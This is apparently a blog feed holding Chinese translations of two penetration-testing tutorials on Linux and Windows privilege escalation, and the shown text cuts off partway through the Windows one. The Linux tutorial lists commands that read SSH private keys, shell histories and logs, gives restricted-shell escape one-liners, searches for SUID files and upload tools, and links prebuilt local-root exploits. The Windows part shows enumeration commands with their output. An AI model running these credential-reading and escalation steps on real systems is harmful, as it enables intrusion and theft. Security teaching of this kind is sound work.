href="#是否有密码-脚本，数据库，配置文件或日志文件？密码的默认路径和位置" class="headerlink" title="是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置"></a>是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置</h4><pre><code>cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg</code></pre><h4 id="用户正在做什么？是否有明文密码？他们在编辑什么？"><a href="#用户正在做什么？是否有明文密码？他们在编辑什么？" class="headerlink" title="用户正在做什么？是否有明文密码？他们在编辑什么？"></a>用户正在做什么？是否有明文密码？他们在编辑什么？</h4><pre><code>cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history</code></pre><h4 id="可以找到哪些用户信息？"><a href="#可以找到哪些用户信息？" class="headerlink" title="可以找到哪些用户信息？"></a>可以找到哪些用户信息？</h4><pre><code>cat ~/.bashrc cat ~/.profile cat /var/mail/root cat /var/spool/mail/root</code></pre><h4 id="可以找到私钥信息吗？"><a href="#可以找到私钥信息吗？" class="headerlink" title="可以找到私钥信息吗？"></a>可以找到私钥信息吗？</h4><pre><code>cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key `</code></pre><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h4 id="哪些配置文件可以写在-etc-中？能够重新配置服务吗？"><a href="#哪些配置文件可以写在-etc-中？能够重新配置服务吗？" class="headerlink" title="哪些配置文件可以写在/ etc /中？能够重新配置服务吗？"></a>哪些配置文件可以写在/ etc /中？<em>能够重新配置服务吗？</em></h4><pre><code>ls -aRl /etc/ | awk &#39;$1 ~ /^.*w.*/&#39; 2&gt;/dev/null     # Anyone ls -aRl /etc/ | awk &#39;$1 ~ /^..w/&#39; 2&gt;/dev/null       # Owner ls -aRl /etc/ | awk &#39;$1 ~ /^.....w/&#39; 2&gt;/dev/null    # Group ls -aRl /etc/ | awk &#39;$1 ~ /w.$/&#39; 2&gt;/dev/null        # Other  find /etc/ -readable -type f 2&gt;/dev/null               # Anyone find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null   # Anyone `</code></pre><h4 id="在-var-中可以找到什么？"><a href="#在-var-中可以找到什么？" class="headerlink" title="在/ var /中可以找到什么？"></a>在/ var /中可以找到什么？</h4><pre><code>ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases</code></pre><h4 id="网站上的任何设置-文件（隐藏）？有数据库信息的任何设置文件？"><a href="#网站上的任何设置-文件（隐藏）？有数据库信息的任何设置文件？" class="headerlink" title="网站上的任何设置/文件（隐藏）？有数据库信息的任何设置文件？"></a>网站上的任何设置/文件（隐藏）？<em>有数据库信息的任何设置文件？</em></h4><pre><code>ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/</code></pre><p>日志文件中是否有任何内容（可以帮助“本地文件包含”！）</p><pre><code>cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/  Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp `</code></pre><p>注：http：//<a href="http://www.thegeekstuff.com/2011/08/linux-var-log-files/" target="_blank" rel="noopener">www.thegeekstuff.com/2011/08/linux-var-log-files/</a></p><h4 id="如果命令有限，你会打破“监狱”外壳？"><a href="#如果命令有限，你会打破“监狱”外壳？" class="headerlink" title="如果命令有限，你会打破“监狱”外壳？"></a>如果命令有限，你会打破“监狱”外壳？</h4><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; echo os.system(&#39;/bin/bash&#39;) /bin/sh -i</code></pre><h4 id="如何安装文件系统？"><a href="#如何安装文件系统？" class="headerlink" title="如何安装文件系统？"></a>如何安装文件系统？</h4><pre><code>mount df -h</code></pre><h4 id="是否有任何未安装的文件系统？"><a href="#是否有任何未安装的文件系统？" class="headerlink" title="是否有任何未安装的文件系统？"></a>是否有任何未安装的文件系统？</h4><pre><code>cat /etc/fstab</code></pre><h4 id="使用了什么“高级Linux文件权限”？"><a href="#使用了什么“高级Linux文件权限”？" class="headerlink" title="使用了什么“高级Linux文件权限”？"></a>使用了什么“高级Linux文件权限”？</h4><pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</code></pre><h4 id="哪里可以写入和执行？一些常见的地方：-tmp，-var-tmp，-dev-shm"><a href="#哪里可以写入和执行？一些常见的地方：-tmp，-var-tmp，-dev-shm" class="headerlink" title="哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shm"></a>哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shm</h4><pre><code>find / -writable -type d 2&gt;/dev/null      # world-writeable folders find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders  find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders  find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</code></pre><h4 id="任何“问题”文件？可写字，“无人”文件"><a href="#任何“问题”文件？可写字，“无人”文件" class="headerlink" title="任何“问题”文件？可写字，“无人”文件"></a>任何“问题”文件？可写字，“无人”文件</h4><pre><code>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files</code></pre><h2 id="准备和寻找利用代码"><a href="#准备和寻找利用代码" class="headerlink" title="准备和寻找利用代码"></a>准备和寻找利用代码</h2><h4 id="安装-支持哪些开发工具-语言？"><a href="#安装-支持哪些开发工具-语言？" class="headerlink" title="安装/支持哪些开发工具/语言？"></a>安装/支持哪些开发工具/语言？</h4><pre><code>find / -name perl* find / -name python*  find / -name gcc* find / -name cc</code></pre><h4 id="如何上传文件？"><a href="#如何上传文件？" class="headerlink" title="如何上传文件？"></a>如何上传文件？</h4><pre><code>find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp</code></pre><h4 id="查找漏洞利用代码"><a href="#查找漏洞利用代码" class="headerlink" title="查找漏洞利用代码"></a>查找漏洞利用代码</h4><p><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com</a></p><p><a href="http://1337day.com/" target="_blank" rel="noopener">http://1337day.com</a></p><p><a href="http://www.securiteam.com/" target="_blank" rel="noopener">http://www.securiteam.com</a></p><p><a href="http://www.securityfocus.com/" target="_blank" rel="noopener">http://www.securityfocus.com</a></p><p><a href="http://www.exploitsearch.net/" target="_blank" rel="noopener">http://www.exploitsearch.net</a></p><p><a href="http://metasploit.com/modules/" target="_blank" rel="noopener">http://metasploit.com/modules/</a></p><p><a href="http://securityreason.com/" target="_blank" rel="noopener">http://securityreason.com</a></p><p><a href="http://seclists.org/fulldisclosure/" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/</a></p><p><a href="http://www.google.com/" target="_blank" rel="noopener">http://www.google.com</a></p><h4 id="查找有关该漏洞利用的更多信息"><a href="#查找有关该漏洞利用的更多信息" class="headerlink" title="查找有关该漏洞利用的更多信息"></a>查找有关该漏洞利用的更多信息</h4><p><a href="http://www.cvedetails.com/" target="_blank" rel="noopener">http://www.cvedetails.com</a></p><pre><code>http://packetstormsecurity.org/files/cve/[CVE]http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]http://www.vulnview.com/cve-details.php?cvename=[CVE]</code></pre><h4 id="（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担"><a href="#（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担" class="headerlink" title="（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担"></a>（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担</h4><p><a href="http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/" target="_blank" rel="noopener">http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/</a></p><p><a href="http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/" target="_blank" rel="noopener">http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</a></p><h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><h4 id="上述任何信息都很容易找到吗？"><a href="#上述任何信息都很容易找到吗？" class="headerlink" title="上述任何信息都很容易找到吗？"></a>上述任何信息都很容易找到吗？</h4><p>试试吧！设置一个自动执行脚本和/或第三方产品的cron作业</p><h4 id="系统是否完全打补丁？"><a href="#系统是否完全打补丁？" class="headerlink" title="系统是否完全打补丁？"></a>系统是否完全打补丁？</h4><p>内核，操作系统，所有应用程序，插件和Web服务</p><pre><code>apt-get update &amp;&amp; apt-get upgrade yum update</code></pre><h4 id="服务是否以最低权限级别运行？"><a href="#服务是否以最低权限级别运行？" class="headerlink" title="服务是否以最低权限级别运行？"></a>服务是否以最低权限级别运行？</h4><p>例如，您是否需要以root身份运行MySQL？</p><h4 id="脚本任何一个都可以自动化吗？！"><a href="#脚本任何一个都可以自动化吗？！" class="headerlink" title="脚本任何一个都可以自动化吗？！"></a>脚本任何一个都可以自动化吗？！</h4><p><a href="http://pentestmonkey.net/tools/unix-privesc-check/" target="_blank" rel="noopener">http://pentestmonkey.net/tools/unix-privesc-check/</a></p><p><a href="http://labs.portcullis.co.uk/application/enum4linux/" target="_blank" rel="noopener">http://labs.portcullis.co.uk/application/enum4linux/</a></p><p><a href="http://bastille-linux.sourceforge.net/" target="_blank" rel="noopener">http://bastille-linux.sourceforge.net</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文链接：&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.g0tmi1k.com
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Windows权限提升基础</title>
    <link href="/2019/03/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%9F%BA%E7%A1%80/"/>
    <id>/2019/03/Windows权限提升基础/</id>
    <published>2019-03-18T05:29:26.000Z</published>
    <updated>2019-03-18T06:09:23.282Z</updated>
    
    <content type="html"><![CDATA[<p>原文链接：<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></p><h1 id="Windows权限提升基础"><a href="#Windows权限提升基础" class="headerlink" title="Windows权限提升基础"></a>Windows权限提升基础</h1><p>没有多少人谈论严重的Windows权限升级，这是一种耻辱。我认为造成这种情况的原因可能是（1）在测试时，低版权的外壳通常都是客户需要的证据，（2）在分阶段的环境中，你经常会弹出管理员账号，（3）米预测让你懒惰（getsystem = lazy-fu），（4）构建评论经常最终成为 - &gt;认证nessus scan，microsoft security baseline analyzer …</p><p>与常见的看法相反，如果配置小心，Windows机箱可以很好地锁定。最重要的是，补丁时间窗口机会很小。因此，让我们深入了解Windows操作系统的黑暗角落，看看我们是否可以获得SYSTEM。</p><p>应该注意的是，我将使用各种版本的Windows来突出显示可能存在的任何命令行差异。请记住这一点，因为在不存在的命令或产生稍微不同的输出方面可能存在各种OS / SP差异。我已经尝试构建本教程，因此它将以最常用的方式应用于Windows权限提升。</p><p>最后，我想向我的朋友Kostas大声喊叫，他也非常喜欢后期开发，你真的不希望他登录你的机器。</p><p>不可或缺的资源：<br>Windows Privilege Escalation百科全书（Brett Moore） -  <a href="http://www.youtube.com/watch?v=kMG8IsCohHA" target="_blank" rel="noopener">这里</a>。<br>Windows攻击：AT是新黑人（Chris Gates＆Rob Fuller） -  <a href="http://www.youtube.com/watch?v=_8xJaaQlpBo" target="_blank" rel="noopener">这里</a>。<br>通过利用弱文件夹权限提升权限（Parvez Anwar） -  <a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="noopener">这里</a>。</p><h2 id="Δt-for-t0-to-t3-初始信息收集"><a href="#Δt-for-t0-to-t3-初始信息收集" class="headerlink" title="Δt for t0 to t3 - 初始信息收集"></a>Δt for t0 to t3 - 初始信息收集</h2><p>  本教程的起点是一个盒子上没有特权的shell。我们可能使用了远程攻击或客户端攻击，我们得到了一个shell。基本上在时间t0，我们不了解机器，它做什么，它连接到什么，我们有什么级别的特权，甚至是什么操作系统。</p><p>最初，我们希望快速收集一些基本信息，以便我们可以获得一块土地并评估我们的情况。</p><p>首先让我们找出我们连接的操作系统：  </p><pre><code>C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;OS Name:                   Microsoft Windows 7 ProfessionalOS Version:                6.1.7601 Service Pack 1 Build 7601</code></pre><p>接下来，我们将看到框的主机名是什么以及我们连接的用户是什么。</p><pre><code>C:\Windows\system32&gt; hostnameb33fC:\Windows\system32&gt; echo %username%user1</code></pre><p>现在我们有了这个基本信息，我们在框中列出了其他用户帐户，并更详细地查看了我们自己的用户信息。我们已经可以看到user1不是本地组管理员的一部分。</p><pre><code>C:\Windows\system32&gt; net usersUser accounts for \\B33F-------------------------------------------------------------------------------Administrator            b33f                     Guestuser1The command completed successfully.C:\Windows\system32&gt; net user user1User name                    user1Full NameCommentUser&#39;s commentCountry code                 000 (System Default)Account active               YesAccount expires              NeverPassword last set            1/11/2014 7:47:14 PMPassword expires             NeverPassword changeable          1/11/2014 7:47:14 PMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   1/11/2014 8:05:09 PMLogon hours allowed          AllLocal Group Memberships      *UsersGlobal Group memberships     *NoneThe command completed successfully.</code></pre><p> 这就是我们目前需要了解的用户和权限。我们列表中的下一步是网络，连接到的机器是什么以及它对这些连接施加了什么规则。</p><p>首先让我们看一下可用的网络接口和路由表。  </p><pre><code>C:\Windows\system32&gt; ipconfig /allWindows IP Configuration   Host Name . . . . . . . . . . . . : b33f   Primary Dns Suffix  . . . . . . . :   Node Type . . . . . . . . . . . . : Hybrid   IP Routing Enabled. . . . . . . . : No   WINS Proxy Enabled. . . . . . . . : NoEthernet adapter Bluetooth Network Connection:   Media State . . . . . . . . . . . : Media disconnected   Connection-specific DNS Suffix  . :   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29   DHCP Enabled. . . . . . . . . . . : Yes   Autoconfiguration Enabled . . . . : YesEthernet adapter Local Area Connection:   Connection-specific DNS Suffix  . :   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection   Physical Address. . . . . . . . . : 00-0C-29-56-79-35   DHCP Enabled. . . . . . . . . . . : Yes   Autoconfiguration Enabled . . . . : Yes   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM   Default Gateway . . . . . . . . . : 192.168.0.1   DHCP Server . . . . . . . . . . . : 192.168.0.1   DHCPv6 IAID . . . . . . . . . . . : 234884137   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35   DNS Servers . . . . . . . . . . . : 192.168.0.1   NetBIOS over Tcpip. . . . . . . . : EnabledC:\Windows\system32&gt; route print===========================================================================Interface List 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network) 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection  1...........................Software Loopback Interface 1 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface===========================================================================IPv4 Route Table===========================================================================Active Routes:Network Destination        Netmask          Gateway       Interface  Metric          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306      192.168.0.0    255.255.255.0         On-link     192.168.0.104    266    192.168.0.104  255.255.255.255         On-link     192.168.0.104    266    192.168.0.255  255.255.255.255         On-link     192.168.0.104    266        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306        224.0.0.0        240.0.0.0         On-link     192.168.0.104    266  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306  255.255.255.255  255.255.255.255         On-link     192.168.0.104    266===========================================================================Persistent Routes:  NoneIPv6 Route Table===========================================================================Active Routes: If Metric Network Destination      Gateway 14     58 ::/0                     On-link  1    306 ::1/128                  On-link 14     58 2001::/32                On-link 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128                                    On-link 11    266 fe80::/64                On-link 14    306 fe80::/64                On-link 14    306 fe80::8d2:b4e:3f57:ff97/128                                    On-link 11    266 fe80::5cd4:9caf:61c0:ba6e/128                                    On-link  1    306 ff00::/8                 On-link 14    306 ff00::/8                 On-link 11    266 ff00::/8                 On-link===========================================================================Persistent Routes:  None# arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.C:\Windows\system32&gt; arp -AInterface: 192.168.0.104 --- 0xb  Internet Address      Physical Address      Type  192.168.0.1           90-94-e4-c5-b0-46     dynamic  192.168.0.101         ac-22-0b-af-bb-43     dynamic  192.168.0.255         ff-ff-ff-ff-ff-ff     static  224.0.0.22            01-00-5e-00-00-16     static  224.0.0.251           01-00-5e-00-00-fb     static  224.0.0.252           01-00-5e-00-00-fc     static  239.255.255.250       01-00-5e-7f-ff-fa     static  255.255.255.255       ff-ff-ff-ff-ff-ff     static</code></pre><p>这将我们带到活动网络连接和防火墙规则。</p><pre><code>C:\Windows\system32&gt; netstat -anoActive Connections  Proto  Local Address          Foreign Address        State           PID  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1400  TCP    192.168.0.104:139      0.0.0.0:0              LISTENING       4  TCP    [::]:135               [::]:0                 LISTENING       684  TCP    [::]:445               [::]:0                 LISTENING       4  TCP    [::]:5357              [::]:0                 LISTENING       4  UDP    0.0.0.0:5355           *:*                                    1100  UDP    0.0.0.0:52282          *:*                                    976  UDP    0.0.0.0:55202          *:*                                    2956  UDP    0.0.0.0:59797          *:*                                    1400  UDP    127.0.0.1:1900         *:*                                    2956  UDP    127.0.0.1:65435        *:*                                    2956  UDP    192.168.0.104:137      *:*                                    4  UDP    192.168.0.104:138      *:*                                    4  UDP    192.168.0.104:1900     *:*                                    2956  UDP    192.168.0.104:5353     *:*                                    1400  UDP    192.168.0.104:65434    *:*                                    2956  UDP    [::]:5355              *:*                                    1100  UDP    [::]:52281             *:*                                    976  UDP    [::]:52283             *:*                                    976  UDP    [::]:55203             *:*                                    2956  UDP    [::]:59798             *:*                                    1400  UDP    [::1]:1900             *:*                                    2956  UDP    [::1]:5353             *:*                                    1400  UDP    [::1]:65433            *:*                                    2956  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956# The following two netsh commands are examples of commands that are not universal across OS/SP. The netshfirewall commands are only available from XP SP2 and upwards.C:\Windows\system32&gt; netsh firewall show stateFirewall status:-------------------------------------------------------------------Profile                           = StandardOperational mode                  = EnableException mode                    = EnableMulticast/broadcast response mode = EnableNotification mode                 = EnableGroup policy version              = Windows FirewallRemote admin mode                 = DisablePorts currently open on all network interfaces:Port   Protocol  Version  Program-------------------------------------------------------------------No ports are currently open on all network interfaces.C:\Windows\system32&gt; netsh firewall show configDomain profile configuration:-------------------------------------------------------------------Operational mode                  = EnableException mode                    = EnableMulticast/broadcast response mode = EnableNotification mode                 = EnableAllowed programs configuration for Domain profile:Mode     Traffic direction    Name / Program-------------------------------------------------------------------Port configuration for Domain profile:Port   Protocol  Mode    Traffic direction     Name-------------------------------------------------------------------ICMP configuration for Domain profile:Mode     Type  Description-------------------------------------------------------------------Enable   2     Allow outbound packet too bigStandard profile configuration (current):-------------------------------------------------------------------Operational mode                  = EnableException mode                    = EnableMulticast/broadcast response mode = EnableNotification mode                 = EnableService configuration for Standard profile:Mode     Customized  Name-------------------------------------------------------------------Enable   No          Network DiscoveryAllowed programs configuration for Standard profile:Mode     Traffic direction    Name / Program-------------------------------------------------------------------Enable   Inbound              COMRaider / E:\comraider\comraider.exeEnable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exePort configuration for Standard profile:Port   Protocol  Mode    Traffic direction     Name-------------------------------------------------------------------ICMP configuration for Standard profile:Mode     Type  Description-------------------------------------------------------------------Enable   2     Allow outbound packet too bigLog configuration:-------------------------------------------------------------------File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.logMax file size   = 4096 KBDropped packets = DisableConnections     = Disable</code></pre><p>最后，我们将简要介绍受感染的盒子上运行的内容：计划任务，运行进程，已启动服务和已安装的驱动程序。</p><pre><code># This will display verbose output for all scheduled tasks, below you can see sample output for asingle task.C:\Windows\system32&gt; schtasks /query /fo LIST /vFolder: \Microsoft\Windows DefenderHostName:                             B33FTaskName:                             \Microsoft\Windows Defender\MP Scheduled ScanNext Run Time:                        1/22/2014 5:11:13 AMStatus:                               ReadyLogon Mode:                           Interactive/BackgroundLast Run Time:                        N/ALast Result:                          1Author:                               N/ATask To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob                                      -WinTask -RestrictPrivilegesScanStart In:                             N/AComment:                              Scheduled ScanScheduled Task State:                 EnabledIdle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutesPower Management:                     No Start On BatteriesRun As User:                          SYSTEMDelete Task If Not Rescheduled:       EnabledStop Task If Runs X Hours and X Mins: 72:00:00Schedule:                             Scheduling data is not available in this format.Schedule Type:                        DailyStart Time:                           5:11:13 AMStart Date:                           1/1/2000End Date:                             1/1/2100Days:                                 Every 1 day(s)Months:                               N/ARepeat: Every:                        DisabledRepeat: Until: Time:                  DisabledRepeat: Until: Duration:              DisabledRepeat: Stop If Still Running:        Disabled[..Snip..]# The following command links running processes to started services.C:\Windows\system32&gt; tasklist /SVCImage Name                     PID Services========================= ======== ============================================System Idle Process              0 N/ASystem                           4 N/Asmss.exe                       244 N/Acsrss.exe                      332 N/Acsrss.exe                      372 N/Awininit.exe                    380 N/Awinlogon.exe                   428 N/Aservices.exe                   476 N/Alsass.exe                      484 SamSslsm.exe                        496 N/Asvchost.exe                    588 DcomLaunch, PlugPlay, Powersvchost.exe                    668 RpcEptMapper, RpcSssvchost.exe                    760 Audiosrv, Dhcp, eventlog,                                   HomeGroupProvider, lmhosts, wscsvcsvchost.exe                    800 AudioEndpointBuilder, CscService, Netman,                                   SysMain, TrkWks, UxSms, WdiSystemHost,                                   wudfsvcsvchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,                                   LanmanServer, MMCSS, ProfSvc, Schedule,                                   seclogon, SENS, ShellHWDetection, Themes,                                   Winmgmt, wuauservaudiodg.exe                    916 N/Asvchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,                                   WdiServiceHost, WinHttpAutoProxySvcsvchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,                                   NlaSvcspoolsv.exe                   1244 Spoolersvchost.exe                   1272 BFE, DPS, MpsSvcmDNSResponder.exe             1400 Bonjour Servicetaskhost.exe                  1504 N/Ataskeng.exe                   1556 N/Avmtoolsd.exe                  1580 VMToolsdwm.exe                       1660 N/Aexplorer.exe                  1668 N/Avmware-usbarbitrator.exe      1768 VMUSBArbServiceTPAutoConnSvc.exe             1712 TPAutoConnSvc[..Snip..]C:\Windows\system32&gt; net startThese Windows services are started:   Application Experience   Application Information   Background Intelligent Transfer Service   Base Filtering Engine   Bluetooth Support Service   Bonjour Service   COM+ Event System   COM+ System Application   Cryptographic Services   DCOM Server Process Launcher   Desktop Window Manager Session Manager   DHCP Client   Diagnostic Policy Service   Diagnostic Service Host   Diagnostic System Host   Distributed Link Tracking Client   Distributed Transaction Coordinator   DNS Client   Function Discovery Provider Host   Function Discovery Resource Publication   Group Policy Client[..Snip..]# This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holesthan Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.C:\Windows\system32&gt; DRIVERQUERYModule Name  Display Name           Driver Type   Link Date============ ====================== ============= ======================1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PMACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PMAcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PMadp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AMadpahci      adpahci                Kernel        5/2/2007 1:29:26 AMadpu320      adpu320                Kernel        2/28/2007 8:03:08 AMAFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PMagp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AMaic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AMaliide       aliide                 Kernel        7/14/2009 7:11:17 AMamdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AMamdide       amdide                 Kernel        7/14/2009 7:11:19 AMAmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AMAmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AMamdsata      amdsata                Kernel        3/19/2010 9:08:27 AMamdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AMamdxata      amdxata                Kernel        3/20/2010 12:19:01 AMAppID        AppID Driver           Kernel        11/20/2010 5:29:48 PMarc          arc                    Kernel        5/25/2007 5:31:06 AM[..Snip..]</code></pre><h2 id="Δt-for-t4-WMIC的奥术艺术"><a href="#Δt-for-t4-WMIC的奥术艺术" class="headerlink" title="Δt for t4 - WMIC的奥术艺术"></a>Δt for t4 - WMIC的奥术艺术</h2><p>  我想分别提到WMIC（Windows Management Instrumentation命令行），因为它是Windows最有用的命令行工具。WIMIC对于信息收集和后期开发非常实用。据说它有点笨重，输出还有很多不足之处。</p><p>完全解释WMIC的使用将采用它自己的全部教程。更不用说由于格式化，一些输出将难以显示。</p><p>我在下面列出了两个非常值得阅读的资源：<br>Command-Line Ninjitsu（SynJunkie） - <a href="http://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html" target="_blank" rel="noopener">这里是</a><br>Windows WMIC命令行（ComputerHope） - <a href="http://www.computerhope.com/wmic.htm" target="_blank" rel="noopener">这里</a></p><p>不幸的是，除非用户在Administrators组中，否则某些Windows默认配置不允许访问WMIC（这可能是一个非常好的主意）。从我对VM的测试中我注意到，任何版本的XP都不允许从低权限帐户访问WMIC。相反，Windows 7 Professional和Windows 8 